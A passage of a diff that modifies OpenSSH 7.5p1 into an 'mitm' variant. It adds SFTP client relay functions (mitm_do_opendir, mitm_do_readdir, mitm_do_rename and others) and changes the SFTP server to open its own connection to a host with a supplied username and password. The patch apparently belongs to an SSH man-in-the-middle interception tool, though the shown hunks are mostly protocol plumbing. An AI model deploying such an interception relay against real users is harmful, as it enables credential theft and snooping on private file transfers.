+ 	} else if (type != SSH2_FXP_ATTRS) {
+@@ -322,7 +325,7 @@
+ 
+ static int
+ get_decode_statvfs(struct sftp_conn *conn, struct sftp_statvfs *st,
+-    u_int expected_id, int quiet)
++    u_int expected_id, int quiet, u_int *status)
+ {
+ 	struct sshbuf *msg;
+ 	u_char type;
+@@ -342,14 +345,12 @@
+ 	if (id != expected_id)
+ 		fatal("ID mismatch (%u != %u)", id, expected_id);
+ 	if (type == SSH2_FXP_STATUS) {
+-		u_int status;
+-
+-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
++		if ((r = sshbuf_get_u32(msg, status)) != 0)
+ 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 		if (quiet)
+-			debug("Couldn't statvfs: %s", fx2txt(status));
++			debug("Couldn't statvfs: %s", fx2txt(*status));
+ 		else
+-			error("Couldn't statvfs: %s", fx2txt(status));
++			error("Couldn't statvfs: %s", fx2txt(*status));
+ 		sshbuf_free(msg);
+ 		return -1;
+ 	} else if (type != SSH2_FXP_EXTENDED_REPLY) {
+@@ -523,7 +524,7 @@
+ 	u_int count, id, i, expected_id, ents = 0;
+ 	size_t handle_len;
+ 	u_char type, *handle;
+-	int status = SSH2_FX_FAILURE;
++	int status = SSH2_FX_FAILURE, status_ret;
+ 	int r;
+ 
+ 	if (dir)
+@@ -539,7 +540,7 @@
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 	send_msg(conn, msg);
+ 
+-	handle = get_handle(conn, id, &handle_len,
++	handle = get_handle(conn, id, &status_ret, &handle_len,
+ 	    "remote readdir(\"%s\")", path);
+ 	if (handle == NULL) {
+ 		sshbuf_free(msg);
+@@ -730,7 +731,7 @@
+ }
+ 
+ Attrib *
+-do_stat(struct sftp_conn *conn, const char *path, int quiet)
++do_stat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)
+ {
+ 	u_int id;
+ 
+@@ -740,11 +741,11 @@
+ 	    conn->version == 0 ? SSH2_FXP_STAT_VERSION_0 : SSH2_FXP_STAT,
+ 	    path, strlen(path));
+ 
+-	return(get_decode_stat(conn, id, quiet));
++	return(get_decode_stat(conn, id, quiet, status));
+ }
+ 
+ Attrib *
+-do_lstat(struct sftp_conn *conn, const char *path, int quiet)
++do_lstat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)
+ {
+ 	u_int id;
+ 
+@@ -753,20 +754,20 @@
+ 			debug("Server version does not support lstat operation");
+ 		else
+ 			logit("Server version does not support lstat operation");
+-		return(do_stat(conn, path, quiet));
++		return(do_stat(conn, path, quiet, status));
+ 	}
+ 
+ 	id = conn->msg_id++;
+ 	send_string_request(conn, id, SSH2_FXP_LSTAT, path,
+ 	    strlen(path));
+ 
+-	return(get_decode_stat(conn, id, quiet));
++	return(get_decode_stat(conn, id, quiet, status));
+ }
+ 
+ #ifdef notyet
+ Attrib *
+ do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len,
+-    int quiet)
++    int quiet, u_int *status)
+ {
+ 	u_int id;
+ 
+@@ -774,7 +775,7 @@
+ 	send_string_request(conn, id, SSH2_FXP_FSTAT, handle,
+ 	    handle_len);
+ 
+-	return(get_decode_stat(conn, id, quiet));
++	return(get_decode_stat(conn, id, quiet, status));
+ }
+ #endif
+ 
+@@ -1076,6 +1077,7 @@
+ 	struct sshbuf *msg;
+ 	u_int id;
+ 	int r;
++	u_int status;
+ 
+ 	if ((conn->exts & SFTP_EXT_STATVFS) == 0) {
+ 		error("Server does not support statvfs@openssh.com extension");
+@@ -1095,7 +1097,7 @@
+ 	send_msg(conn, msg);
+ 	sshbuf_free(msg);
+ 
+-	return get_decode_statvfs(conn, st, id, quiet);
++	return get_decode_statvfs(conn, st, id, quiet, &status);
+ }
+ 
+ #ifdef notyet
+@@ -1105,6 +1107,7 @@
+ {
+ 	struct sshbuf *msg;
+ 	u_int id;
++	u_int status;
+ 
+ 	if ((conn->exts & SFTP_EXT_FSTATVFS) == 0) {
+ 		error("Server does not support fstatvfs@openssh.com extension");
+@@ -1124,7 +1127,7 @@
+ 	send_msg(conn, msg);
+ 	sshbuf_free(msg);
+ 
+-	return get_decode_statvfs(conn, st, id, quiet);
++	return get_decode_statvfs(conn, st, id, quiet, &status);
+ }
+ #endif
+ 
+@@ -1172,10 +1175,11 @@
+ 	TAILQ_HEAD(reqhead, request) requests;
+ 	struct request *req;
+ 	u_char type;
++	u_int status_ret;
+ 
+ 	TAILQ_INIT(&requests);
+ 
+-	if (a == NULL && (a = do_stat(conn, remote_path, 0)) == NULL)
++	if (a == NULL && (a = do_stat(conn, remote_path, 0, &status_ret)) == NULL)
+ 		return -1;
+ 
+ 	/* Do not preserve set[ug]id here, as we do not preserve ownership */
+@@ -1212,7 +1216,7 @@
+ 	send_msg(conn, msg);
+ 	debug3("Sent message SSH2_FXP_OPEN I:%u P:%s", id, remote_path);
+ 
+-	handle = get_handle(conn, id, &handle_len,
++	handle = get_handle(conn, id, &status_ret, &handle_len,
+ 	    "remote open(\"%s\")", remote_path);
+ 	if (handle == NULL) {
+ 		sshbuf_free(msg);
+@@ -1453,6 +1457,7 @@
+ 	SFTP_DIRENT **dir_entries;
+ 	char *filename, *new_src, *new_dst;
+ 	mode_t mode = 0777;
++	u_int status_ret;
+ 
+ 	if (depth >= MAX_DIR_DEPTH) {
+ 		error("Maximum directory depth exceeded: %d levels", depth);
+@@ -1460,7 +1465,7 @@
+ 	}
+ 
+ 	if (dirattrib == NULL &&
+-	    (dirattrib = do_stat(conn, src, 1)) == NULL) {
++	    (dirattrib = do_stat(conn, src, 1, &status_ret)) == NULL) {
+ 		error("Unable to stat remote directory \"%s\"", src);
+ 		return -1;
+ 	}
+@@ -1579,6 +1584,7 @@
+ 	TAILQ_HEAD(ackhead, outstanding_ack) acks;
+ 	struct outstanding_ack *ack = NULL;
+ 	size_t handle_len;
++	int status_ret;
+ 
+ 	TAILQ_INIT(&acks);
+ 
+@@ -1607,8 +1613,9 @@
+ 		a.flags &= ~SSH2_FILEXFER_ATTR_ACMODTIME;
+ 
+ 	if (resume) {
++	  u_int status_ret2;
+ 		/* Get remote file size if it exists */
+-		if ((c = do_stat(conn, remote_path, 0)) == NULL) {
++		if ((c = do_stat(conn, remote_path, 0, &status_ret2)) == NULL) {
+ 			close(local_fd);
+ 			return -1;
+ 		}
+@@ -1643,7 +1650,7 @@
+ 
+ 	sshbuf_reset(msg);
+ 
+-	handle = get_handle(conn, id, &handle_len,
++	handle = get_handle(conn, id, &status_ret, &handle_len,
+ 	    "remote open(\"%s\")", remote_path);
+ 	if (handle == NULL) {
+ 		close(local_fd);
+@@ -1818,7 +1825,8 @@
+ 	 * the path already existed and is a directory.
+ 	 */
+ 	if (do_mkdir(conn, dst, &a, 0) != 0) {
+-		if ((dirattrib = do_stat(conn, dst, 0)) == NULL)
++		u_int status_ret;
++		if ((dirattrib = do_stat(conn, dst, 0, &status_ret)) == NULL)
+ 			return -1;
+ 		if (!S_ISDIR(dirattrib->perm)) {
+ 			error("\"%s\" exists but is not a directory", dst);
+@@ -1904,3 +1912,424 @@
+ 	return(ret);
+ }
+ 
++u_char *
++mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status)
++{
++	struct sshbuf *msg;
++	u_int id;
++	u_char *handle;
++	int r;
++
++	id = conn->msg_id++;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_OPENDIR)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, path)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++
++	handle = get_handle(conn, id, status, handle_len,
++	    "remote opendir(\"%s\")", path);
++	sshbuf_free(msg);
++	return handle;
++}
++
++Stat *
++mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status) {
++	struct sshbuf *msg;
++	Stat *ret;
++	int r;
++	u_char type;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_READDIR)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_string(msg, handle_str, handle_len)) != 0)
++	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
++	send_msg(conn, msg);
++	sshbuf_reset(msg);
++	get_msg(conn, msg);
++	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
++	    (r = sshbuf_get_u32(msg, &id)) != 0)
++	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
++	debug3("Received reply T:%u I:%u", type, id);
++	
++	if (type == SSH2_FXP_STATUS) {
++	  u_int rstatus;
++	  
++	  if ((r = sshbuf_get_u32(msg, &rstatus)) != 0)
++	    fatal("%s: buffer error: %s",
++		  __func__, ssh_err(r));
++	  debug3("Received SSH2_FXP_STATUS %d", rstatus);
++
++	  sshbuf_free(msg); msg = NULL;
++	  *status = rstatus;
++	  return NULL;
++	} else if (type != SSH2_FXP_NAME)
++	  fatal("Expected SSH2_FXP_NAME(%u) packet, got %u",
++		SSH2_FXP_NAME, type);
++
++	if ((r = sshbuf_get_u32(msg, count)) != 0)
++	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	if (*count > SSHBUF_SIZE_MAX)
++	  fatal("%s: nonsensical number of entries", __func__);
++	if (*count == 0) {
++	  sshbuf_free(msg); msg = NULL;
++	  *status = SSH2_FX_EOF;
++	  return NULL;
++	}
++
++	debug3("Received %d SSH2_FXP_NAME responses", *count);
++
++	ret = xcalloc(*count, sizeof(Stat));
++
++	for (u_int i = 0; i < *count; i++) {
++	  char *name, *long_name;
++	  Attrib a;
++
++	  if ((r = sshbuf_get_cstring(msg, &name, NULL)) != 0 ||
++	      (r = sshbuf_get_cstring(msg, &long_name, NULL)) != 0)
++	    fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	  if ((r = decode_attrib(msg, &a)) != 0) {
++	    free(name); name = NULL;
++	    free(long_name); long_name = NULL;
++	    sshbuf_free(msg); msg = NULL;
++	    *status = SSH2_FX_FAILURE;
++	    return NULL;
++	  }
++	  ret[i].name = name;
++	  ret[i].long_name = long_name;
++	  ret[i].attrib = a;
++	}
++	return ret;
++}
++
++u_int
++mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len)
++{
++	u_int id;
++	struct sshbuf *msg;
++	int r;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++
++	id = conn->msg_id++;
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_CLOSE)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_string(msg, handle, handle_len)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	sshbuf_free(msg);
++
++	debug3("Sent message SSH2_FXP_CLOSE I:%u", id);
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a)
++{
++	u_int id;
++
++	id = conn->msg_id++;
++	send_string_attrs_request(conn, id, SSH2_FXP_MKDIR, path, strlen(path), a);
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_rmdir(struct sftp_conn *conn, const char *path)
++{
++	u_int id;
++
++	id = conn->msg_id++;
++	send_string_request(conn, id, SSH2_FXP_RMDIR, path, strlen(path));
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_rm(struct sftp_conn *conn, const char *path)
++{
++	u_int id;
++
++	id = conn->msg_id++;
++	send_string_request(conn, id, SSH2_FXP_REMOVE, path, strlen(path));
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy)
++{
++	struct sshbuf *msg;
++	u_int id;
++	int r, use_ext = (conn->exts & SFTP_EXT_POSIX_RENAME) && !force_legacy;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++
++	/* Send rename request */
++	id = conn->msg_id++;
++	if (use_ext) {
++		if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
++		    (r = sshbuf_put_u32(msg, id)) != 0 ||
++		    (r = sshbuf_put_cstring(msg,
++		    "posix-rename@openssh.com")) != 0)
++			fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	} else {
++		if ((r = sshbuf_put_u8(msg, SSH2_FXP_RENAME)) != 0 ||
++		    (r = sshbuf_put_u32(msg, id)) != 0)
++			fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	}
++	if ((r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	debug3("Sent message %s \"%s\" -> \"%s\"",
++	    use_ext ? "posix-rename@openssh.com" :
++	    "SSH2_FXP_RENAME", oldpath, newpath);
++	sshbuf_free(msg);
++
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a)
++{
++	u_int id = conn->msg_id++;
++	send_string_attrs_request(conn, id, SSH2_FXP_SETSTAT, path, strlen(path), a);
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a)
++{
++	u_int id = conn->msg_id++;
++	send_string_attrs_request(conn, id, SSH2_FXP_FSETSTAT, handle, handle_len, a);
++	return get_status(conn, id);
++}
++
++Attrib *
++mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status)
++{
++	u_int id = conn->msg_id++;
++	send_string_request(conn, id, SSH2_FXP_FSTAT, handle, handle_len);
++	return(get_decode_stat(conn, id, quiet, status));
++}
++
++/* Returns 1 on success, with "filename", "longname", and "a" args set to the values obtained, or 0 on failure, with "status" arg set. */
++int
++mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a)
++{
++	struct sshbuf *msg;
++	u_int expected_id, count, id;
++	u_char type;
++	int r;
++
++	expected_id = id = conn->msg_id++;
++	send_string_request(conn, id, SSH2_FXP_READLINK, path, strlen(path));
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++
++	get_msg(conn, msg);
++	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
++	    (r = sshbuf_get_u32(msg, &id)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
++	if (id != expected_id)
++		fatal("ID mismatch (%u != %u)", id, expected_id);
++
++	if (type == SSH2_FXP_STATUS) {
++		if ((r = sshbuf_get_u32(msg, status)) != 0)
++			fatal("%s: buffer error: %s", __func__, ssh_err(r));
++		sshbuf_free(msg);
++		return 0;
++	} else if (type != SSH2_FXP_NAME)
++		fatal("Expected SSH2_FXP_NAME(%u) packet, got %u",
++		    SSH2_FXP_NAME, type);
++
++	if ((r = sshbuf_get_u32(msg, &count)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	if (count != 1)
++		fatal("Got multiple names (%d) from SSH_FXP_READLINK", count);
++
++	if ((r = sshbuf_get_cstring(msg, filename, NULL)) != 0 ||
++	    (r = sshbuf_get_cstring(msg, longname, NULL)) != 0 ||
++	    (r = decode_attrib(msg, a)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++
++	debug3("SSH_FXP_READLINK %s -> %s", path, *filename);
++	sshbuf_free(msg);
++	return 1;
++}
++
++u_int
++mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)
++{
++	struct sshbuf *msg;
++	u_int id;
++	int r;
++
++	if (conn->version < 3)
++		return SSH2_FX_OP_UNSUPPORTED;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++
++	/* Send symlink request */
++	id = conn->msg_id++;
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_SYMLINK)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	debug3("Sent message SSH2_FXP_SYMLINK \"%s\" -> \"%s\"", oldpath,
++	    newpath);
++	sshbuf_free(msg);
++
++	return get_status(conn, id);
++}
++
++int
++mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status)
++{
++	struct sshbuf *msg;
++	u_int id;
++	int r;
++	struct sftp_statvfs sftp_st;
++
++	if ((conn->exts & SFTP_EXT_STATVFS) == 0)
++		return SSH2_FX_OP_UNSUPPORTED;
++
++	id = conn->msg_id++;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++	sshbuf_reset(msg);
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, "statvfs@openssh.com")) != 0 ||
++	    (r = sshbuf_put_cstring(msg, path)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	sshbuf_free(msg);
++
++	if (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)
++	  return -1;
++
++	st->f_bsize = sftp_st.f_bsize;
++	st->f_frsize = sftp_st.f_frsize;
++	st->f_blocks = sftp_st.f_blocks;
++	st->f_bfree = sftp_st.f_bfree;
++	st->f_bavail = sftp_st.f_bavail;
++	st->f_files = sftp_st.f_files;
++	st->f_ffree = sftp_st.f_ffree;
++	st->f_favail = sftp_st.f_favail;
++	st->f_fsid = sftp_st.f_fsid;
++	st->f_flag = sftp_st.f_flag;
++	st->f_namemax = sftp_st.f_namemax;
++	return 1;
++}
++
++int
++mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status)
++{
++	struct sshbuf *msg;
++	int r;
++	u_int id;
++	struct sftp_statvfs sftp_st;
++
++	if ((conn->exts & SFTP_EXT_FSTATVFS) == 0)
++		return SSH2_FX_OP_UNSUPPORTED;
++
++	id = conn->msg_id++;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++	sshbuf_reset(msg);
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, "fstatvfs@openssh.com")) != 0 ||
++	    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	sshbuf_free(msg);
++
++	if (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)
++	  return -1;
++
++	st->f_bsize = sftp_st.f_bsize;
++	st->f_frsize = sftp_st.f_frsize;
++	st->f_blocks = sftp_st.f_blocks;
++	st->f_bfree = sftp_st.f_bfree;
++	st->f_bavail = sftp_st.f_bavail;
++	st->f_files = sftp_st.f_files;
++	st->f_ffree = sftp_st.f_ffree;
++	st->f_favail = sftp_st.f_favail;
++	st->f_fsid = sftp_st.f_fsid;
++	st->f_flag = sftp_st.f_flag;
++	st->f_namemax = sftp_st.f_namemax;
++	return 1;
++}
++
++u_int
++mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)
++{
++	struct sshbuf *msg;
++	u_int id;
++	int r;
++
++	if ((conn->exts & SFTP_EXT_HARDLINK) == 0)
++		return SSH2_FX_OP_UNSUPPORTED;
++
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++
++	/* Send link request */
++	id = conn->msg_id++;
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, "hardlink@openssh.com")) != 0 ||
++	    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	debug3("Sent message hardlink@openssh.com \"%s\" -> \"%s\"",
++	       oldpath, newpath);
++	sshbuf_free(msg);
++
++	return get_status(conn, id);
++}
++
++u_int
++mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len)
++{
++	struct sshbuf *msg;
++	u_int id;
++	int r;
++
++	/* Silently return if the extension is not supported */
++	if ((conn->exts & SFTP_EXT_FSYNC) == 0)
++		return SSH2_FX_OP_UNSUPPORTED;
++
++	/* Send fsync request */
++	if ((msg = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++	id = conn->msg_id++;
++	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
++	    (r = sshbuf_put_u32(msg, id)) != 0 ||
++	    (r = sshbuf_put_cstring(msg, "fsync@openssh.com")) != 0 ||
++	    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)
++		fatal("%s: buffer error: %s", __func__, ssh_err(r));
++	send_msg(conn, msg);
++	debug3("Sent message fsync@openssh.com I:%u", id);
++	sshbuf_free(msg);
++
++	return get_status(conn, id);
++}
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.h openssh-7.5p1-mitm/sftp-client.h
+--- openssh-7.5p1/sftp-client.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp-client.h	2017-07-12 12:19:20.310726952 -0400
+@@ -21,6 +21,9 @@
+ #ifndef _SFTP_CLIENT_H
+ #define _SFTP_CLIENT_H
+ 
++#include <sys/statvfs.h>
++#include "misc.h"
++
+ #ifdef USE_SYSTEM_GLOB
+ # include <glob.h>
+ #else
+@@ -53,6 +56,23 @@
+ 	u_int64_t f_namemax;
+ };
+ 
++struct sftp_conn {
++	int fd_in;
++	int fd_out;
++	u_int transfer_buflen;
++	u_int num_requests;
++	u_int version;
++	u_int msg_id;
++#define SFTP_EXT_POSIX_RENAME	0x00000001
++#define SFTP_EXT_STATVFS	0x00000002
++#define SFTP_EXT_FSTATVFS	0x00000004
++#define SFTP_EXT_HARDLINK	0x00000008
++#define SFTP_EXT_FSYNC		0x00000010
++	u_int exts;
++	u_int64_t limit_kbps;
++	struct bwlimit bwlimit_in, bwlimit_out;
++};
++
+ /*
+  * Initialise a SSH filexfer connection. Returns NULL on error or
+  * a pointer to a initialized sftp_conn struct on success.
+@@ -80,10 +100,10 @@
+ int do_rmdir(struct sftp_conn *, const char *);
+ 
+ /* Get file attributes of 'path' (follows symlinks) */
+-Attrib *do_stat(struct sftp_conn *, const char *, int);
++Attrib *do_stat(struct sftp_conn *, const char *, int, u_int *);
+ 
+ /* Get file attributes of 'path' (does not follow symlinks) */
+-Attrib *do_lstat(struct sftp_conn *, const char *, int);
++Attrib *do_lstat(struct sftp_conn *, const char *, int, u_int *);
+ 
+ /* Set file attributes of 'path' */
+ int do_setstat(struct sftp_conn *, const char *, Attrib *);
+@@ -139,4 +159,36 @@
+ /* Concatenate paths, taking care of slashes. Caller must free result. */
+ char *path_append(const char *, const char *);
+ 
++u_int mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len);
++
++u_int mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a);
++
++Attrib *mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status);
++
++int mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status);
++
++u_int mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len);
++
++u_int mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);
++
++u_int mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a);
++
++u_char *mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status);
++
++Stat *mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status);
++
++int mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a);
++
++u_int mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy);
++
++u_int mitm_do_rmdir(struct sftp_conn *conn, const char *path);
++
++u_int mitm_do_rm(struct sftp_conn *conn, const char *path);
++
++u_int mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a);
++
++int mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status);
++
++u_int mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);
++
+ #endif
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-common.h openssh-7.5p1-mitm/sftp-common.h
+--- openssh-7.5p1/sftp-common.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp-common.h	2017-07-07 13:08:46.225251440 -0400
+@@ -50,3 +50,12 @@
+ char	*ls_file(const char *, const struct stat *, int, int);
+ 
+ const char *fx2txt(int);
++
++/* portable attributes, etc. */
++typedef struct Stat Stat;
++
++struct Stat {
++	char *name;
++	char *long_name;
++	Attrib attrib;
++};
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-glob.c openssh-7.5p1-mitm/sftp-glob.c
+--- openssh-7.5p1/sftp-glob.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp-glob.c	2017-07-07 15:51:57.651427070 -0400
+@@ -111,8 +111,9 @@
+ fudge_lstat(const char *path, struct stat *st)
+ {
+ 	Attrib *a;
++	u_int status;
+ 
+-	if (!(a = do_lstat(cur.conn, (char *)path, 1)))
++	if (!(a = do_lstat(cur.conn, (char *)path, 1, &status)))
+ 		return(-1);
+ 
+ 	attrib_to_stat(a, st);
+@@ -124,8 +125,9 @@
+ fudge_stat(const char *path, struct stat *st)
+ {
+ 	Attrib *a;
++	u_int status;
+ 
+-	if (!(a = do_stat(cur.conn, (char *)path, 1)))
++	if (!(a = do_stat(cur.conn, (char *)path, 1, &status)))
+ 		return(-1);
+ 
+ 	attrib_to_stat(a, st);
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.h openssh-7.5p1-mitm/sftp.h
+--- openssh-7.5p1/sftp.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp.h	2017-07-06 14:11:25.389016830 -0400
+@@ -97,5 +97,5 @@
+ 
+ struct passwd;
+ 
+-int	sftp_server_main(int, char **, struct passwd *);
++int	sftp_server_main(int, char **, struct passwd *, char *, unsigned short, char *, char *);
+ void	sftp_server_cleanup_exit(int) __attribute__((noreturn));
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server.c openssh-7.5p1-mitm/sftp-server.c
+--- openssh-7.5p1/sftp-server.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp-server.c	2017-07-12 12:32:03.997026526 -0400
+@@ -39,6 +39,7 @@
+ #include <time.h>
+ #include <unistd.h>
+ #include <stdarg.h>
++#include <sys/wait.h>
+ 
+ #include "xmalloc.h"
+ #include "sshbuf.h"
+@@ -50,6 +51,7 @@
+ 
+ #include "sftp.h"
+ #include "sftp-common.h"
++#include "sftp-client.h"
+ 
+ /* Our verbosity */
+ static LogLevel log_level = SYSLOG_LEVEL_ERROR;
+@@ -74,14 +76,11 @@
+ /* Requests that are allowed/denied */
+ static char *request_whitelist, *request_blacklist;
+ 
+-/* portable attributes, etc. */
+-typedef struct Stat Stat;
++pid_t sshpid = -1;
++volatile sig_atomic_t interrupted = 0;
++int showprogress = 0;
++extern struct sftp_conn *client_conn;
+ 
+-struct Stat {
+-	char *name;
+-	char *long_name;
+-	Attrib attrib;
+-};
+ 
+ /* Packet handlers */
+ static void process_open(u_int32_t id);
+@@ -108,6 +107,7 @@
+ static void process_extended_hardlink(u_int32_t id);
+ static void process_extended_fsync(u_int32_t id);
+ static void process_extended(u_int32_t id);
++struct sftp_conn *make_connection(char *host, unsigned short port, char *username, char *password);
+ 
+ struct sftp_handler {
+ 	const char *name;	/* user-visible name for fine-grained perms */
+@@ -362,6 +362,7 @@
+ 	return NULL;
+ }
+ 
++/*
+ static DIR *
+ handle_to_dir(int handle)
+ {
+@@ -369,6 +370,7 @@
+ 		return handles[handle].dirp;
+ 	return NULL;
+ }
++*/
+ 
+ static int
+ handle_to_fd(int handle)
+@@ -416,6 +418,7 @@
+ 	return 0;
+ }
+ 
++/*
+ static int
+ handle_close(int handle)
+ {
+@@ -434,6 +437,7 @@
+ 	}
+ 	return ret;
+ }
++*/
+ 
